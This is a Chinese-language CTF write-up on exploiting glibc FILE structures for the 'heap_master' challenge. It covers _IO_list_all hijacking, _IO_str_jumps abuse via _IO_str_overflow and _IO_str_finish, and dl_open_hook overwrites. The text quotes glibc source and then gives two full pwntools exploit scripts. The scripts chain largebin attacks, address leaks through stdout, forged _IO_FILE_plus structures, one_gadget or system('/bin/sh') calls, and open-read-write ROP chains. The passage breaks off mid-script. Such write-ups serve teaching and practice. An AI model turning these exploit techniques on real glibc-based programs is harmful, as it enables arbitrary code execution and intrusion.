_IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; /* offset 0x68 (64bits) */ int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE //开始宏判断（这段判断结果为否，所以没有定义_IO_FILE_complete，下面还是_IO_FILE）&#125;;struct _IO_FILE_complete&#123; struct _IO_FILE _file;#endif //结束宏判断#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001 //依然是_IO_FILE的内容 _IO_off64_t _offset;# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf;# else void *__pad1; void *__pad2; void *__pad3; void *__pad4;# endif size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];#endif&#125;; _IO_file的利用主要分为两种： 利用stdout和stdin文件输入输出流进行地址泄露和数据修改。 利用_IO_list_all进行程序控制流的劫持。 第一种利用方式：泄露地址的利用方法很简单，只要有办法向_IO_2_1_stdout结构体写入东西，就有机会成功，需要达成两个条件：（之后会根据题目详解两个条件） f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1 _IO_write_base!=_IO_write_ptr 任意地址写的条件比较苛刻，题目好久之前做过一道，具体都记不清了，有时间再来总结：2018_hctf_babyprintf_ver2 第二种利用方式：通过_IO_list_all劫持程序控制流。我们大家最熟悉的house of orange就是在libc2.23下诞生的在当时最新型的利用方式，网上大师傅们的分析也非常全面细致，我就不再浪费时间了，以下结构体和函数源码部分摘抄与veritas501 house_of_orange最后的劫持程序执行流部分： 我们在malloc的时候程序会出错，调用malloc_printerr函数，如下 1234if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av);c 而malloc_printerr则又调用了__libc_message。 1234567891011121314151617181920212223242526static voidmalloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)&#123; /* Avoid using this arena in future. We do not attempt to synchronize this with anything else because we minimally want to ensure that __libc_message gets its resources safely without stumbling on the current corruption. */ if (ar_ptr) set_arena_corrupt (ar_ptr); if ((action &amp; 5) == 5) __libc_message (action &amp; 2, "%s\n", str); else if (action &amp; 1) &#123; char buf[2 * sizeof (uintptr_t) + 1]; buf[sizeof (buf) - 1] = '\0'; char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0); while (cp &gt; buf) *--cp = '0'; __libc_message (action &amp; 2, "*** Error in `%s': %s: 0x%s ***\n", __libc_argv[0] ? : "&lt;unknown&gt;", str, cp); &#125; else if (action &amp; 2) abort ();&#125; 而__libc_message则又调用了abort。 1234567891011121314/* Abort with an error message. */void__libc_message (int do_abort, const char *fmt, ...)&#123;...... if (do_abort) &#123; BEFORE_ABORT (do_abort, written, fd); /* Kill the application. */ abort ();//调用abort &#125;&#125; 而abort则又调用了fflush。 123456789101112131415/* Cause an abnormal program termination with core-dump. */voidabort (void)&#123;...... /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if (stage == 1) &#123; ++stage; fflush (NULL);//调用fflush &#125; ...... 而fflush其实就是_IO_flush_all_lockp。 1#define fflush(s) _IO_flush_all_lockp (0) 而_IO_flush_all_lockp中用到了_IO_list_all，并最终通过vtable调用了_IO_OVERFLOW。 12345678910111213141516171819202122232425262728293031323334int _IO_flush_all_lockp (int do_lock)&#123;...... last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; //_IO_list_all赋给fp while (fp != NULL) &#123;...... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)//需要bypass的条件#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))//需要bypass的条件#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)//改 _IO_OVERFLOW 为 system 劫持程序流！ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain;//指向下一个fp（从main_arena到heap） &#125;......&#125; 由于逻辑短路原则，想要调用后面的_IO_OVERFLOW (fp, EOF)，前面的条件必须满足，即： 1234561.fp-&gt;_mode &lt;= 02.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base或1._IO_vtable_offset (fp) == 02.fp-&gt;_mode &gt; 03.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base （主推第一种。。。） 主要想总结一下libc2.24以后的利用方法。 glibc2.24下：因为glibc2.24对vtable指针进行了检查，所以我们就不能自由改写vtable了，但是随之而来的产生了一个新的方法：利用_IO_str_jumps结构体，其和IO_jump_t一样，其成员也全部是函数指针。 123456789101112131415161718192021222324pwndbg&gt; p _IO_str_jumps $1 = &#123; __dummy = 0, __dummy2 = 0, __finish = 0x7ff39312db70 &lt;_IO_str_finish&gt;, __overflow = 0x7ff39312d850 &lt;__GI__IO_str_overflow&gt;, __underflow = 0x7ff39312d7f0 &lt;__GI__IO_str_underflow&gt;, __uflow = 0x7ff39312c370 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ff39312db50 &lt;__GI__IO_str_pbackfail&gt;, __xsputn = 0x7ff39312c3d0 &lt;__GI__IO_default_xsputn&gt;, __xsgetn = 0x7ff39312c550 &lt;__GI__IO_default_xsgetn&gt;, __seekoff = 0x7ff39312dca0 &lt;__GI__IO_str_seekoff&gt;, __seekpos = 0x7ff39312c730 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ff39312c600 &lt;_IO_default_setbuf&gt;, __sync = 0x7ff39312c9b0 &lt;_IO_default_sync&gt;, __doallocate = 0x7ff39312c7a0 &lt;__GI__IO_default_doallocate&gt;, __read = 0x7ff39312d6a0 &lt;_IO_default_read&gt;, __write = 0x7ff39312d6b0 &lt;_IO_default_write&gt;, __seek = 0x7ff39312d680 &lt;_IO_default_seek&gt;, __close = 0x7ff39312c9b0 &lt;_IO_default_sync&gt;, __stat = 0x7ff39312d690 &lt;_IO_default_stat&gt;, __showmanyc = 0x7ff39312d6c0 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ff39312d6d0 &lt;_IO_default_imbue&gt;&#125; 我们主要把目光放到两个函数上： _IO_str_overflow（_GI_IO_str_overflow）:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int _IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES)// pass return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))// should in &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ // pass return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen)//pass 一般会通过 return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);//target [fp+0xe0] if (new_buf == NULL) &#123; /* __ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, '\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125;libc_hidden_def (_IO_str_overflow) 我们可以固定的这么构造： 1234567_flags = 0_IO_write_ptr = 0x7fffffffffffffff //极大即可_IO_write_base = 0_IO_buf_end = (binsh_addr-100)/2 //(addr_of_first_arry-100)/2_IO_buf_base = 0fp+0xe0 = addr_of_func/gadget/one_gadgetfp+0xd8 = addr_of_IO_str_jumps 我们把_IO_list_all的值改为我们可控的地址，在这个地址上伪造_IO_file_plus，将vtable设为_IO_str_jumps的地址，然后当程序发生：malloc_printerr，exit()，main函数return之一时，程序就会调用：__libc_message-&gt;abort-&gt;fllush/_IO_flush_all_lockp(从_IO_list_all开始清理文件结构体)-&gt;伪造的vtable(_IO_str_jumps_addr)-&gt;调用_IO_str_overflow-&gt;获得一次任意地址call的机会。 _IO_str_finish:这个函数要比_IO_str_overflow要简单的多。 12345678void _IO_str_finish (_IO_FILE *fp, int dummy)&#123; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) //唯一需要bypass的条件 (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);// getshell ， [fp+0xe8] fp-&gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);&#125; 我们可以这样构造： 1234_flags = 0_IO_buf_base = binsh_addr //addr_of_first_arryfp+0xe8 = addr_of_func/gadget/one_gadgetfp+0xd8 = addr_of_IO_str_jumps - 8 在这道题中会显示这两个函数的具体使用方法。 第一种方法：思路：第一种方法是用largebin_attack的两次向任意地址写victim的地址，来对stdout结构体的flag(需满足f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1)和_IO_write_base的最后一个字节（错位写入，修改_IO_read_base的前七个字节和_IO_write_base的最后一个字节，victim的地址长度不够八个字节会将缺的位自动当为零写入）进行修改，利用mmap地址的随机性（大概1/16的概率）可以泄露出mmap的地址的基址和libc的地址。 然后再利用largebin_attack向_IO_list_all写入victim的地址，在victim处伪造一个fake_IO_file_plus，利用exit()中的_IO_flush_all_lockp调用_IO_str_overflow（所以在fp+0xd8处（也就是vtable处）我们应填入_IO_str_jumps的地址），利用_IO_str_overflow中的call [rdi+0xe0]来进行程序控制流的劫持(rdi里装的是_IO_str_overflow的第一个参数fp，也就是当前的文件结构体指针)，这里因为远程只能用orw(open read write)来读取flag，但是在本地的话可以直接用one_gadget或者system(&#39;/bin/sh\x00&#39;)来打开shell，所以在exp的最后地方会有一个分支。 除此之外，我还用了上面已经说过了的_IO_str_overflow和_IO_str_finish的方法来劫持程序执行流，具体的构造方法上面已经说得很详细 ，而且可以根据具体情况自己调试来自己修改构造。对于choice = 4的orw的思路，我是借鉴了天枢e3pem学长的题解，他的文章已经说得很清晰明了，包括在libc-2.25的环境下的调试和exp学长也已经给出，我就不敢再赘述（在文末已贴出链接）。 exp如下(libc-2.23)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new_(p,size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade_(p,offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete_(p,offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): while 1: try: p = process('./heap_master') new = lambda x: new_(p,x) upgrade = lambda x,y: upgrade_(p,x,y) delete = lambda x: delete_(p,x) offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(0x2620-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(0x2620-0x20+0x19)) delete(offset+0x10) new(0x60) p.recv(0x18) libcbase = u64(p.recv(8)) - (0x7f1f383306e0-0x7f1f37f6d000) log.success('libcbase = '+hex(libcbase)) mmap_addr = u64(p.recv(4).ljust(8,'\x00')) - (0xb800-0x6000) log.success('mmap_addr = '+hex(mmap_addr)) #------------------------------leak success and largebin_attack again--------------- _IO_list_all_addr = libcbase + 0x3c5520 _IO_str_jumps_addr = libcbase + 0x7f1517e807a0 - 0x7f1517abd000 log.success('_IO_list_all_addr = '+hex(_IO_list_all_addr)) log.success('_IO_str_jumps_addr = '+hex(_IO_str_jumps_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(_IO_list_all_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(_IO_list_all_addr-0x20)) delete(offset+0x10) new(0x60) #------------------------modify_IO_list_all success------------------------------- choice = 1 #1:one_gadget 2:_IO_str_finish:system('/bin/sh\x00') 3:_IO_str_overflow:system('/bin/sh\x00') 4:orw if choice == 1: one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147] upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(libcbase + one_gadget[1])) if choice == 2: fake_IO_file = p64(0) #flag = 0 fake_IO_file+= p64(0)*3 fake_IO_file+= p64(0) #_IO_write_base fake_IO_file+= p64(1) #_IO_write_ptr fake_IO_file+= p64(1) #_IO_write_end fake_IO_file+= p64(mmap_addr) #_IO_buf_base = addr_of_bin_sh upgrade(0,'/bin/sh\x00') upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr-8)) upgrade(offset+0xe8,p64(libcbase + libc.sym['system'])) if choice == 3: fake_IO_file = p64(0) #flag = 0 fake_IO_file+= p64(0)*3 fake_IO_file+= p64(0) #_IO_write_base fake_IO_file+= p64(0xffffffff) #_IO_write_ptr fake_IO_file+= p64(0) #_IO_write_end fake_IO_file+= p64(0) #_IO_buf_base = 0 fake_IO_file+= p64((mmap_addr-100)/2) #_IO_buf_base = (arry_addr-100)/2 upgrade(0,'/bin/sh\x00') upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(libcbase + libc.sym['system'])) if choice == 4: p_rdi = libcbase + 0x21102 p_rdx_rsi = libcbase + 0x1150c9 p_rsp = libcbase + 0x3838 p_rsp_r13 = libcbase + 0x206c3 p_rbx_rbp_j_rdx = libcbase + 0x12d751 orw = [ p_rdi,mmap_addr, p_rdx_rsi,0,0, libcbase+libc.sym['open'], p_rdi,3, p_rdx_rsi,0x100,mmap_addr+0x1000, libcbase+libc.sym['read'], p_rdi,1, p_rdx_rsi,0x100,mmap_addr+0x1000, libcbase+libc.sym['write'], ] fake_IO_file = p64(0) fake_IO_file+= p64(p_rsp) fake_IO_file+= p64(mmap_addr+8) fake_IO_file+= p64(0) fake_IO_file+= p64(0) fake_IO_file+= p64(p_rsp_r13) upgrade(0,'./flag\x00\x00' + flat(orw)) upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(p_rbx_rbp_j_rdx)) #gdb.attach(p) p.recvuntil('&gt;&gt; ') p.sendline('0') break except: p.close() p.interactive()if __name__ == '__main__': mypwn() 心得： 关于f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1，这个flag的构造方法其实很简单，分成两部分来看，第一部分：f-&gt;flag &amp; 0xa00!=NULL，和1010 0000 0000按位与不为NULL的话，很简单只要保证是0x8xx或者0x2xx或者0xaxx就行了，这也是为什么我们看到的很多构造是flag = 0xfbad1800或者0xfbad2877啥的，其后三位都是0x8xx，第二部分：f-&gt;flag &amp; 0x1000 == 1，这个更简单了，和0001 0000 0000 0000按位与不为0即可，这个利用mmap地址的随机性随便都能成立吧。 我们选择进行largebin_attack的两块chunk的大小不能随意选择或差距过大，因为一条链的chunk大小是有范围的，（看表格你会发现好像我这道题用的chunk的size（0x4f0和0x510）明明是分在两个链上的。。但实际上那个size=0x4f0的chunk之前的size是等于0x510的，我是先把他放进去再改的大小。。。正常情况是不能这么做的。）图片来源:veritas501 一次largebin_attack可以向任意两个地址同时写victim_addr一次，一次unsortedbin_attack可以向一个任意地址写main_arena+88一次，但是写完之后这条largebin和unsortedbin都会损坏，如需继续使用我们需要注意修补。（largebin可以直接换一条链。。） 这题如果可以直接拿shell倒也不是很难，我觉得难点主要在于两方面，一方面是环境是2.25，对我这种一直用虚拟机的玩家来说怎么在ubuntu16.04上运行2.25的libc和ld.so是需要面对的第一个问题，好在这个已经得到初步解决（看e3pme的文章），一方面是orw让我们必须劫持栈rsp到mmap的我们自己已经填好rop_chain的地址上，加上找gadgets等一系列麻烦事，使难度上了一个档次。 第二种方法：第二种方法的泄露方法和第一种方法一样，但是改变了控制程序执行流的方法。 思路分析：第二种方法我们使用modify dl_open_hook的方法来劫持程序控制流，利用largebin_attack将dl_open_hook覆盖为victim的地址，因为当malloc和free报错时，会调用__libc_dlopen_mode函数，在其中会将dl_open_hook的值赋给一个寄存器，然后会call [寄存器]，也就等于是call [victim_addr]，所以我们可以在victim的地址处填好one_gadget或者gadgets来劫持程序控制流。 因为dl_open_hook赋值给的寄存器因libc版本不同而不同，我们调试发现在libc2.25中赋值给的寄存器是rbx。调试确定是哪个寄存器的方法是： rwatch *addr_dl_open_hook c 程序会卡到*addr_dl_open_hook参与操作的那一条指令。我们可以发现在libc2.25是rbx，libc2.23是rax。 我们发现在libc2.25下发现了： 1230x7FD7D: mov rdi, [rbx+48h] mov rsi, r13 call qword ptr [rbx+40h] 这个gadget我们可以完全控制住rdi和程序执行流，和setcontext+53结合，我们可以控制所有寄存器并劫持栈，但是在libc2.23版本因为找不到合适的gadget与rax配合，所以暂时未解出，希望有师傅解出能让我借鉴一下。 exp如下(libc-2.25)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)elf = change_ld('./heap_master','./ld-linux-x86-64.so.2')p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;)def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade(offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete(offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): stdout = 0x2600 libc = ELF('./libc-2.25.so') offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(stdout-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(stdout-0x20+0x19)) delete(offset+0x10) new(0x60) mmap_addr = u64(p.recv(8)) - (0xdffa3800- 0xdff9e000) log.success('mmap_addr = '+hex(mmap_addr)) libcbase = u64(p.recv(8)) - (0x7f7684c72683-0x7f76848d4000) log.success('libcbase = '+hex(libcbase)) setcontext = libcbase + 0x43565 log.success('setcontext+53 = '+hex(setcontext)) dl_open_hook_addr = libcbase + (0x7fa15b2162e0-0x7fa15ae74000) log.success('dl_open_hook_addr = '+hex(dl_open_hook_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x20)) delete(offset+0x10) new(0x60) choice = 2 #1. one_gadget 全部失败 2. orw if choice == 1: one_gadget = [0x40bdb,0x40c2f,0xd9925] upgrade(offset,p64(libcbase+one_gadget[2])) if choice == 2: ''' 0x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx 0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax 0x7ffff7a7a5af &lt;setcontext+127&gt;: ret ''' mygadget = 